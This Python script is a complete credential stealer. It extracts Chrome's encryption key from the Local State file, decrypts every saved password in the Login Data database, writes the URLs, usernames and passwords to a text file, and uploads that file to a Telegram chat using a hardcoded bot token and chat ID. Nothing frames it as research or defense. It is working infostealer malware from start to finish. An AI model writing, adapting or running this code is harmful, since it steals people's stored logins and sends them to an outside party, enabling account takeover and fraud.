import sqlite3
import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import telegram
import asyncio

# Set your Telegram bot token and chat ID
BOT_TOKEN = '7866483331:AAFLe0iNc5VrdZkrByBrDGfr4asHeZi2O9Q'
CHAT_ID = '2044432474'

def get_chrome_encryption_key():
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                    r"Google\Chrome\User Data\Local State")
    with open(local_state_path, 'r') as file:
        local_state = file.read()
        local_state = json.loads(local_state)
    encryption_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encryption_key = encryption_key[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"

def get_saved_passwords():
    db_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\default\Login Data")
    filename = "ChromePasswords.db"
    output_file = "saved_passwords.txt"
    
    # Copy the database and prepare to write to the output file
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value from logins")
    key = get_chrome_encryption_key()
    
    with open(output_file, 'w') as file:
        for row in cursor.fetchall():
            url = row[0]
            username = row[2]
            decrypted_password = decrypt_password(row[3], key)
            file.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
            print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")
    
    cursor.close()
    db.close()
    return output_file

# Define an asynchronous function to send the text file to Telegram
async def send_file_to_telegram(token, chat_id, file_path):
    bot = telegram.Bot(token=token)
    with open(file_path, 'rb') as file:
        await bot.send_document(chat_id=chat_id, document=file)
    print("File sent to Telegram.")

# Main function to get passwords and send the file
if __name__ == "__main__":
    output_file = get_saved_passwords()
    asyncio.run(send_file_to_telegram(BOT_TOKEN, CHAT_ID, output_file))
